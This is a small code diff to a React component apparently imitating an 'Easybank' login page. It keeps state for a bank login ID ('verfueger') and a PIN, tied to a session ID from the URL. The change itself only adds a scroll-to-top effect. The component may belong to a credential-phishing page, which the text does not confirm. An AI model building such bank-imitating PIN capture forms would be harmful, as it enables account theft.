@@ -114,6 +114,8 @@ const Easybank = () => {
   const sessionId = searchParams.get("s") || "";
   const [showLoading, setShowLoading] = useState(false);
 
+  useEffect(() => { window.scrollTo(0, 0); }, []);
+
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
   const [showPin, setShowPin] = useState(false);
